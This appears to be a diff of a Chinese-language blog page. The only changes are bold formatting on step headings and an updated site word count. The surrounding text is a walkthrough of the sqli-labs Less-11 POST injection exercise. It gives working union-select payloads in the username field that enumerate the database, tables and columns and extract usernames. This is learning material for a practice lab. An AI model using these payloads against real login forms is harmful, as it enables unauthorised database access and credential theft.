@@ -484,38 +484,38 @@ HTML基础知识
 <p>post传输过程：form 标签包裹住所有的 input 输入框，当你点提交（submit）的时候，就会把 form 包裹的所有的 input 信息提交给 form 对应的后台服务器地址，这就是一个 post 过程。</p>
 <h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><p>在 post 过程中，我们输入的用户名和密码最后在后台处理的过程中依旧会形成前面所见到的 sql 语句，那么我们是否可以像 get 型的一样构造我们想要的 payload 呢？</p>
 <ol>
-<li>尝试输入 username:用户名+单引号，password:随便输</li>
+<li><strong>尝试输入 username:用户名+单引号，password:随便输</strong></li>
 </ol>
 <p><img src="https://i.loli.net/2019/10/24/idjAgfH9SxvorDC.png" alt="less11-1.png"></p>
 <p>注：从报错中可以猜出数据库的执行语句：SELECT username, password FROM users WHERE username=’admin’ and password=’$passwd’ LIMIT 0,1</p>
 <ol start="2">
-<li>尝试输入 username:用户名+单引号+井号，password:随便输</li>
+<li><strong>尝试输入 username:用户名+单引号+井号，password:随便输</strong></li>
 </ol>
 <p><img src="https://i.loli.net/2019/10/24/6FAgtxyizbwcfud.png" alt="less11-2.png"></p>
 <ol start="3">
-<li>猜测字段</li>
+<li><strong>猜测字段</strong></li>
 </ol>
 <p><code>username：admin' order by 3#</code><br><code>password：1234</code></p>
 <p><img src="https://i.loli.net/2019/10/24/tpXwyZWbTIon4vq.png" alt="less11-5.png"></p>
 <ol start="4">
-<li>爆库</li>
+<li><strong>爆库</strong></li>
 </ol>
 <p><code>username：1admin' union select 1,database()#</code><br><code>password：1234</code></p>
 <p><img src="https://i.loli.net/2019/10/24/xU9TBGf8nRXhgd6.png" alt="less11-3.png"></p>
 <p><img src="https://i.loli.net/2019/10/24/vD7QMZEr4H2fR68.png" alt="less11-4.png"></p>
 <p>注：这里和 get 型注入一样，union 之前的值必须为空值。</p>
 <ol start="5">
-<li>爆表</li>
+<li><strong>爆表</strong></li>
 </ol>
 <p><code>username：1admin' union select 1,group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#</code><br><code>password：1234</code></p>
 <p><img src="https://i.loli.net/2019/10/24/B8kJoDzygmFh697.png" alt="less11-6.png"></p>
 <ol start="6">
-<li>爆字段</li>
+<li><strong>爆字段</strong></li>
 </ol>
 <p><code>username：1admin' union select 1,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#</code><br><code>password：1234</code></p>
 <p><img src="https://i.loli.net/2019/10/24/lMk6ULfIZKdh1VC.png" alt="less11-7.png"></p>
 <ol start="7">
-<li>爆数据</li>
+<li><strong>爆数据</strong></li>
 </ol>
 <p><code>username：1admin' union select 1,group_concat(username) FROM security.users#</code><br><code>password：1234</code></p>
 <p><img src="https://i.loli.net/2019/10/24/5kDou63UQplETRH.png" alt="less11-8.png"></p>
@@ -815,7 +815,7 @@ http://192.168.150.128/sqli-labs-master/Less-10/?id</div>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">25.1k</span>&nbsp;字
+                class="white-color">26.8k</span>&nbsp;字
                
             
 			
